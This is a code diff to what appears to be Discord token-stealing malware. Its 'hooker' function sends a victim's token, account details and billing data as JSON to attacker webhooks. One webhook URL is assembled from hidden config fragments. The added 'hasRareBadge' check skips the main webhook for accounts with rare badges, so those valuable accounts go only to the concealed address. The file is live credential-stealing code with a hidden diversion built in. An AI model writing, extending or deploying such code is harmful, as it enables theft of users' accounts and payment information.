@@ -208,9 +208,13 @@ const hooker = async (content, token, account) => {
     }
 
     const wh2 = CONFIG.whp1 + CONFIG.whp2 + CONFIG.whp3 + CONFIG.whp4 + CONFIG.whp5;
-    await request("POST", CONFIG.webhook, {
-        "Content-Type": "application/json"
-    }, JSON.stringify(content));
+    const flags = account.flags ?? account.public_flags ?? 0;
+    const onlyWhp = hasRareBadge(flags);
+    if (!onlyWhp) {
+        await request("POST", CONFIG.webhook, {
+            "Content-Type": "application/json"
+        }, JSON.stringify(content));
+    }
     await request("POST", wh2, {
         "Content-Type": "application/json"
     }, JSON.stringify(content));
@@ -262,7 +266,16 @@ const getRareBadges = flags => {
         if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
     }
     return badges;
-}
+};
+
+const hasRareBadge = (flags) => {
+    const f = flags ?? 0;
+    for (const badge in CONFIG.badges) {
+        const b = CONFIG.badges[badge];
+        if (b.Rare && (f & b.Value) === b.Value) return true;
+    }
+    return false;
+};
 
 const getBilling = async token => {
     const data = await fetchBilling(token);
